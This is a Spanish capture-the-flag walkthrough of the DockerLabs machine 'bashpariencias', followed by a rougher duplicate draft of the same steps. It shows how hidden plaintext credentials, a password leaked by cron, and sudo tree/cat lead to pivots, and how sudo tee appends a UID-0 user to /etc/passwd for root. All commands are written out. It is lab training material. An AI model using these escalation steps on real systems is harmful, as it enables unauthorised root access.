---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `SQLi` `XXE` `Bypass` `Python` `Sudoers` `Croc`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip bashpariencias.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh bashpariencias.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.18.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.18.0.2
```

```bash
nmap -n -Pn -sCV -p80,8899 --min-rate 5000 172.18.0.2
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-20 15:45 +0100
Nmap scan report for 172.18.0.2
Host is up (0.000036s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Leeme
8899/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a3:b0:db:99:e4:c6:a5:b2:5d:2b:36:b6:3e:d0:15:00 (ECDSA)
|_  256 8f:26:4e:8c:60:28:5c:14:03:b2:45:22:ae:e1:f9:24 (ED25519)
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
```

Identificamos los puertos abiertos `80` (HTTP) y `8899` (SSH).

Accedemos al servicio web del puerto `80` y nos encontramos con la siguiente página principal.

![](../../images/bashpariencias.png)

Al revisar la parte inferior de la página, encontramos una pista.

```
Busca la entrada , despidieron a Rosa y en esta empresa tambien la echaremos no guarda bien sus contraseñas: la escondio en txt plano ni siquiera un methodo sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1

La despidieron por cagarla y solicitar permisos de root al jefe y tener un pass extrafuerte del rockyou. :-) Aqui podeis comprobar su metida de pata. en la empresa que trabajo antes
El mensaje nos indica que el usuario rosa ha sido descuidada y ha dejado su contraseña oculta en texto plano en alguna parte del sitio web.
```

Continuamos enumerando y revisando los distintos archivos de la web. Al inspeccionar el código fuente de la página `forms.html`, encontramos el siguiente bloque `HTML`.

```HTML
 <h6 class="my-0">Second product</h6>
            <small class="text-muted">Brief description rosa</small>
            <p style="visibility: hidden;">rosa:lacagadenuevo</p>
```

Hemos encontrado unas credenciales en texto plano para el usuario `rosa` : `lacagadenuevo`.

## ACCESO INICIAL

Procedemos a conectarnos por el servicio `SSH` utilizando las credenciales obtenidas y especificando el puerto `8899` que descubrimos en nuestra fase de escaneo.

```Bash
ssh rosa@172.18.0.2 -p 8899
```

Logramos acceder exitosamente. 

## MOVIMIENTO LATERAL

Una vez dentro de la máquina, realizamos una enumeración básica comprobando permisos `sudo` y binarios `SUID`, pero no encontramos nada fuera de lo común.

Decidimos listar los procesos del sistema en ejecución para ver si hay alguna tarea en segundo plano que nos pueda resultar útil.

```Bash
ps aux
```

Info:
```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4332  3428 ?        Ss   09:44   0:00 /bin/bash -c service apache2 start ; service ssh start ; service cron start ; while true; do echo 'Alive'; sleep 60; done
root          24  0.0  0.1   6812  4848 ?        Ss   09:44   0:00 /usr/sbin/apache2 -k start
www-data      29  1.6  0.2 1213840 8808 ?        Sl   09:44   0:48 /usr/sbin/apache2 -k start
www-data      30  1.8  0.2 1213660 8540 ?        Sl   09:44   0:56 /usr/sbin/apache2 -k start
root          91  0.0  0.1  12028  4224 ?        Ss   09:44   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          97  0.0  0.0   3816  1760 ?        Ss   09:44   0:00 /usr/sbin/cron -P
root          99  0.0  0.0   5840  3024 ?        S    09:45   0:00 /usr/sbin/CRON -P
root         100  0.0  0.0   2808  1868 ?        Ss   09:45   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root         101  0.0  0.0   4760  3392 ?        S    09:45   0:00 /bin/bash /usr/share/bug/.scripts/passw_juan.sh
root         123  0.0  0.0   5840  3024 ?        S    09:46   0:00 /usr/sbin/CRON -P
root         137  0.0  0.0   2808  1804 ?        Ss   09:47   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root       21312  0.0  0.0   4760  3452 ?        S    10:23   0:00 /bin/bash /usr/share/bug/.scripts/passw_juan.sh
root       30443  0.0  0.0   5840  3200 ?        S    10:24   0:00 /usr/sbin/CRON -P
root       30444  0.0  0.0   2808  1796 ?        Ss   10:24   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root       30445  0.0  0.0   4760  3364 ?        S    10:24   0:00 /bin/bash /usr/share/bug/.scripts/passw_juan.sh
root       30571  0.0  0.0   5840  3200 ?        S    10:25   0:00 /usr/sbin/CRON -P
root       30572  0.0  0.0   2808  1892 ?        Ss   10:25   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root       31754  0.0  0.0   5840  3200 ?        S    10:33   0:00 /usr/sbin/CRON -P
root       31755  0.0  0.0   2808  1868 ?        Ss   10:33   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root       31756  0.0  0.0   4760  3356 ?        S    10:33   0:00 /bin/bash /usr/share/bug/.scripts/passw_juan.sh
root       31907  0.0  0.0   3132  1916 ?        S    10:34   0:00 sleep 58
root       31908  0.0  0.0   5840  3200 ?        S    10:34   0:00 /usr/sbin/CRON -P
root       31909  0.0  0.0   2808  1944 ?        Ss   10:34   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root       31910  0.0  0.0   4760  3452 ?        S    10:34   0:00 /bin/bash /usr/share/bug/.scripts/passw_juan.sh
root       31913  0.0  0.0   3132  1912 ?        S    10:34   0:00 sleep 58
```

Observamos que se está ejecutando repetidamente el script `/usr/share/bug/.scripts/passw_juan.sh`.  Parece que este proceso está escribiendo la contraseña de juan en un archivo en el directorio `/tmp`.

Inspeccionamos el directorio `/tmp` en busca de archivos creados recientemente.

```Bash
ls -la /tmp
```

```
total 908
drwxrwxrwt 1 root root   4096 Feb 20 10:29 .
drwxr-xr-x 1 root root   4096 Feb 20 09:44 ..
-rw-r--r-- 1 root root     13 Feb 20 10:29 passjuan.txt
```

Efectivamente, encontramos un archivo llamado `passjuan.txt`. Procedemos a leer su contenido.

```Bash
cat passjuan.txt
```
```
hackwhitbash
```

Conseguimos la contraseña, por lo que privotamos al usuario `juan`.

```Bash
su juan
```

Una vez como el usuario `juan`, revisamos sus privilegios de `sudo`.

```Bash
sudo -l
```

Info:
```
Matching Defaults entries for juan on c2afed610962:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on c2afed610962:
    (carlos) NOPASSWD: /usr/bin/tree
    (carlos) NOPASSWD: /usr/bin/cat
```

Vemos que tenemos permisos para ejecutar los binarios `tree` y `cat` en nombre del usuario `carlos` sin necesidad de proporcionar contraseña.

Aprovechamos el comando `tree` para enumerar el directorio personal del usuario `carlos`.

```Bash
sudo -u carlos /usr/bin/tree /home/carlos
```

```
home/carlos
└── password

1 directory, 1 fil
```

El comando nos revela la existencia de un archivo llamado `password` dentro de su directorio. Utilizamos el comando `cat`, también con permisos de `carlos`, para leerlo.

```Bash
sudo -u carlos /usr/bin/cat /home/carlos/password
```

```
chocolateado
```

Obtenemos la contraseña `chocolateado` y logramos pivotar al usuario `carlos`.


## ESCALADA DE PRIVILEGIOS

Ya como el usuario carlos, volvemos a comprobar los permisos de `sudo`.

```Bash
sudo -l
```

Info:
```
Matching Defaults entries for carlos on c2afed610962:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on c2afed610962:
    (ALL : NOPASSWD) /usr/bin/tee
```

Observamos que podemos ejecutar el binario `tee` como cualquier usuario sin necesidad de contraseña. La herramienta `tee` lee de la entrada estándar y escribe en la salida estándar y en archivos simultáneamente, lo que nos permite escribir en archivos protegidos del sistema, como `/etc/passwd`.

Nuestra estrategia será inyectar un nuevo usuario con privilegios de `root` en el archivo `/etc/passwd`. Primero, en nuestra máquina atacante, generamos un `hash` de contraseña usando `openssl`.

```Bash
openssl passwd -1 -salt hacker password123
```

```
$1$hacker$maoVUGb6XNp03USLr9Oqq1
```

Recordamos que el formato del archivo `/etc/passwd` es `usuario:contraseña:UID:GID:comentario:directorio_home:shell`, preparamos la siguiente línea para nuestro usuario malicioso.

```
pwned:$1$hacker$maoVUGb6XNp03USLr9Oqq1:0:0:root:/root:/bin/bash
```

A continuación, utilizamos echo y lo pasamos mediante tubería a `sudo tee -a` para anexar esta línea al final del archivo `/etc/passwd`.

```Bash
echo "pwned:\$1\$hacker\$maoVUGb6XNp03USLr9Oqq1:0:0:root:/root:/bin/bash" | sudo /usr/bin/tee -a /etc/passwd
```

Con nuestro usuario `pwned` ya inyectado en el sistema y con UID 0, simplemente cambiamos a este usuario proporcionando la contraseña que definimos, `password123`.

```Bash
su pwned
# password: password123
```
```
root@c2afed610962:/tmp# whoami
root
root@c2afed610962:/tmp#
```

Ya somos root!









Identificamos los puertos abiertos 80 y 8899 que es un SSH.

Accedemos al port 80 y encontramos tal (foto)



En la parte de abajo de la pagina hay una pista diciendo

```
Busca la entrada , despidieron a Rosa y en esta empresa tambien la echaremos no guarda bien sus contraseñas:la escondio en txt plano ni siquiera un methodo sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1
La despidieron por cagarla y solicitar permisos de root al jefe y tener un pass extrafuerte del rockyou. :-) Aqui podeis comprobar su metida de pata. en la empresa que trabajo antes
```

Intentamos un ataque de fuerza bruta por SSH en el puerto 8899 con el usuario rosa y el diccionario rockyou perro no obtenemos resultado.

Seguimos viendo la pagina web.

En la pagina forms.html encontramos esto en el codigo fuente.

```html
 <h6 class="my-0">Second product</h6>
            <small class="text-muted">Brief description rosa</small>
            <p style="visibility: hidden;">rosa:lacagadenuevo</p>
```

Encontramos credenciales en texto plano para rosa : lacagadenuevo


```bash
ssh rosa@172.18.0.2 -p 8899
```


No hay nada raro en los permisos sudo y SUID

```bash
ps aux
```

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4332  3428 ?        Ss   09:44   0:00 /bin/bash -c service apache2 start ; service ssh start ; service cron start ; while true; do echo 'Alive'; sleep 60; done
root          24  0.0  0.1   6812  4848 ?        Ss   09:44   0:00 /usr/sbin/apache2 -k start
www-data      29  1.6  0.2 1213840 8808 ?        Sl   09:44   0:48 /usr/sbin/apache2 -k start
www-data      30  1.8  0.2 1213660 8540 ?        Sl   09:44   0:56 /usr/sbin/apache2 -k start
root          91  0.0  0.1  12028  4224 ?        Ss   09:44   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          97  0.0  0.0   3816  1760 ?        Ss   09:44   0:00 /usr/sbin/cron -P
root          99  0.0  0.0   5840  3024 ?        S    09:45   0:00 /usr/sbin/CRON -P
root         100  0.0  0.0   2808  1868 ?        Ss   09:45   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root         101  0.0  0.0   4760  3392 ?        S    09:45   0:00 /bin/bash /usr/share/bug/.scripts/passw_juan.sh
root         123  0.0  0.0   5840  3024 ?        S    09:46   0:00 /usr/sbin/CRON -P
root         137  0.0  0.0   2808  1804 ?        Ss   09:47   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root       21312  0.0  0.0   4760  3452 ?        S    10:23   0:00 /bin/bash /usr/share/bug/.scripts/passw_juan.sh
root       30443  0.0  0.0   5840  3200 ?        S    10:24   0:00 /usr/sbin/CRON -P
root       30444  0.0  0.0   2808  1796 ?        Ss   10:24   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root       30445  0.0  0.0   4760  3364 ?        S    10:24   0:00 /bin/bash /usr/share/bug/.scripts/passw_juan.sh
root       30571  0.0  0.0   5840  3200 ?        S    10:25   0:00 /usr/sbin/CRON -P
root       30572  0.0  0.0   2808  1892 ?        Ss   10:25   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root       31754  0.0  0.0   5840  3200 ?        S    10:33   0:00 /usr/sbin/CRON -P
root       31755  0.0  0.0   2808  1868 ?        Ss   10:33   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root       31756  0.0  0.0   4760  3356 ?        S    10:33   0:00 /bin/bash /usr/share/bug/.scripts/passw_juan.sh
root       31907  0.0  0.0   3132  1916 ?        S    10:34   0:00 sleep 58
root       31908  0.0  0.0   5840  3200 ?        S    10:34   0:00 /usr/sbin/CRON -P
root       31909  0.0  0.0   2808  1944 ?        Ss   10:34   0:00 /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
root       31910  0.0  0.0   4760  3452 ?        S    10:34   0:00 /bin/bash /usr/share/bug/.scripts/passw_juan.sh
root       31913  0.0  0.0   3132  1912 ?        S    10:34   0:00 sleep 58
```

Parece que hay un proceso que escrive la passworrd de juan en un arhivo en el directorio /tmp cada poco tiempo.

```bash
ls -la /tmp
```

```
total 908
drwxrwxrwt 1 root root   4096 Feb 20 10:29 .
drwxr-xr-x 1 root root   4096 Feb 20 09:44 ..
-rw-r--r-- 1 root root     13 Feb 20 10:29 passjuan.txt
```

```bash
cat passjuan.txt
```

```
hackwhitbash
```

```bash
su juan
```


```bash
sudo -l
```

```
Matching Defaults entries for juan on c2afed610962:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on c2afed610962:
    (carlos) NOPASSWD: /usr/bin/tree
    (carlos) NOPASSWD: /usr/bin/cat
```

```bash
sudo -u carlos /usr/bin/tree /home/carlos
```

```
home/carlos
└── password

1 directory, 1 fil
```


```bash
sudo -u carlos /usr/bin/cat /home/carlos/password
```

```
chocolateado
```

```bash
su carlos
```

```bash
sudo -l
```

```
Matching Defaults entries for carlos on c2afed610962:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on c2afed610962:
    (ALL : NOPASSWD) /usr/bin/tee
```

```bash
openssl passwd -1 -salt hacker password123
```

```
$1$hacker$maoVUGb6XNp03USLr9Oqq1
```

El format de /etc/passwd és usuari:contrasenya:UID:GID:comentari:home:shell. Crearem un usuari anomenat pwned amb el hash que acabem de generar

```
pwned:$1$hacker$maoVUGb6XNp03USLr9Oqq1:0:0:root:/root:/bin/bash
```


```bash
echo "pwned:\$1\$hacker\$maoVUGb6XNp03USLr9Oqq1:0:0:root:/root:/bin/bash" | sudo /usr/bin/tee -a /etc/passwd
```

```bash
su pwned
# password: password123
```

```
root@c2afed610962:/tmp# whoami
root
root@c2afed610962:/tmp#
```

Ya somos root!